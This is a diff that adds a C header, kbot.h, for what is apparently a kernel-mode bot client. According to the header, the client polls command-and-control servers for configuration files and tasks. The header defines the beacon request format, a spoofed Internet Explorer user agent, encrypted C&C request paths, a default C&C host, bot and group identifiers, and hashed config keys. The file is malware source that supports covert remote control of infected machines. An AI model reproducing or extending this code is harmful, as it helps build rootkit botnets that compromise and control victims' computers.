@@ -1,0 +1,91 @@
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+// KBot project.
+//	
+// module: kbot.h
+// $Revision: 33 $
+// $Date: 2012-07-16 18:27:23 +0400 (Пн, 16 июл 2012) $
+// description: 
+//	Kernel-mode client program.
+//	Connects over the KIP to one of the specified C&C servers and receives specially formed configuration files and commands.
+
+#define		_ENCRYPT_REQUEST_URI		TRUE
+#define		_USE_DIGITAL_SIGNATURE		TRUE
+
+#define		KBOT_VERSION				0x100
+
+#define		KBOT_WAIT_BEFORE_START		10		// milliseconds
+
+#define		KBOT_DEFAULT_CONFIG_PERIOD	60		// seconds
+#define		KBOT_DEFAULT_TASK_PERIOD	60		// seconds
+#define		KBOT_MINIMUM_REQUEST_PERIOD	60		// seconds
+
+#define		KBOT_CONTENT_BUFFER_SIZE	0x1000	// bytes
+
+#define		szKBotConfigFileName		"KBOT.INI"
+#define		szKBotUserIdFileName		"USER.ID"
+
+#define		CRC_PUBLIC_KEY				0xe1285e64
+#define		CRC_KBOT_INI				0x507fbe32
+#define		CRC_GROUP					0x656b798a
+#define		CRC_TASK_PERIOD				0x7c440bb2
+#define		CRC_CONFIG_PERIOD			0x986016fd
+#define		CRC_HOSTS					0xd0665bf6
+#define		CRC_KEY						0xe3c816dc
+
+#define		szRequestFmt		"version=%u&user=%x%x%x%x&server=%u&id=%u&crc=%x"
+#define		szUserAgentFmt		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT %1u.%1u;%s SV1)"
+#define		szX64				" x64;"
+
+#ifdef _ENCRYPT_REQUEST_URI
+	#define	SERVER_DEFAULT_KEY		"0123456789ABCDEF"
+
+	#define		szConfigUri			"/c%s.php?%s="
+	#define		szTaskUri			"/t%s.php?%s="
+#else
+	#define		szConfigUri			"/config.php?"
+	#define		szTaskUri			"/task.php?"
+#endif
+
+#define		KBOT_DEFAULT_HOST_LIST	" 10.30.29.241 "
+#define		INVALID_INDEX		(-1)
+
+
+typedef struct	_KBOT_CONFIG
+{
+#if DBG
+	ULONG	Magic;
+#endif
+	ULONG	ConfigCRC;
+
+	ULONG	ConfigPeriod;	// seconds
+	ULONG	TaskPeriod;		// seconds
+	ULONG	MinimumPeriod;	// seconds
+
+	ULONG	ServerId;
+	ULONG	GroupId;
+
+	PCHAR*	HostArray;
+	PCHAR	pHostList;
+	ULONG	HostCount;
+	ULONG	HostIndex;
+
+	PCHAR	pKey;
+} KBOT_CONFIG, *PKBOT_CONFIG;
+
+typedef struct _KBOT_USER
+{
+	GUID	Id;				// current user ID
+} KBOT_USER, *PKBOT_USER;
+
+#define		KBOT_CONFIG_MAGIC		'TOBK'
+#define		ASSERT_KBOT_CONFIG(x)	ASSERT(x->Magic == KBOT_CONFIG_MAGIC)
+
+#define		KBOT_DEFAULT_SERVER_ID	12
+#define		KBOT_DEFAULT_GROUP_ID	1012
+
+
+PCHAR		g_KbotUserAgent;
+
+
+NTSTATUS	KBotStartup(VOID);
+VOID		KBotCleanup(VOID);
